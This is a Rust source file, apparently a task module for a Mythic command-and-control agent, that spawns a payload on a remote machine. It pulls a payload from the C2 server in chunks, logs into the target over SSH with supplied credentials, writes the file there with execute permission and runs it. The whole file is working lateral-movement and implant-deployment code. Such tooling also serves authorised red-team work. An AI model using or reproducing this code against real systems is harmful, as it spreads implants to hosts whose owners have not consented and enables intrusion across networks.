use super::{ssh_authenticate, Credentials};
use crate::AgentTask;
use crate::ContinuedData;
use crate::{mythic_continued, mythic_success};
use base64::{Engine as _, engine::general_purpose};
use serde::Deserialize;
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

const CHUNK_SIZE: usize = 512000;

#[derive(Debug, Deserialize)]
pub struct SshSpawnArgs {
    pub credentials: Credentials,
    pub host: String,
    pub port: u32,
    pub path: String,
    pub exec: String,
    pub agent: bool,
    pub payload: String,
}

pub fn spawn_payload(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: SshSpawnArgs = serde_json::from_str(&task.parameters)?;

    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": args.payload,
            "chunk_num": 1,
        }),
        "task_id": task.id,
        "user_output": "Uploading payload chunk 1\n",
    }))?;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
    let total_chunks = continued_args.total_chunks.unwrap();

    for chunk_num in 2..=total_chunks {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": args.payload,
                "chunk_num": chunk_num,
            }),
            "task_id": task.id,
            "user_output": format!("Uploading payload chunk {}/{}\n", chunk_num, total_chunks),
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
    }

    tx.send(mythic_continued!(
        task.id,
        "received",
        "Agent received payload\n"
    ))?;

    let shell_cmd = args.exec.to_owned();
    let path = args.path.to_owned();

    let sess = ssh_authenticate(&args.into())?;

    sess.sftp_write(&path, &file_data, 0o700)?;

    let (_stdout, stderr, exit_status) = sess.channel_exec(&shell_cmd)?;

    if exit_status != 0 {
        return Err(format!("Failed to run agent on system. {}", stderr).into());
    }

    tx.send(mythic_success!(task.id, "Exec command completed"))?;
    Ok(())
}
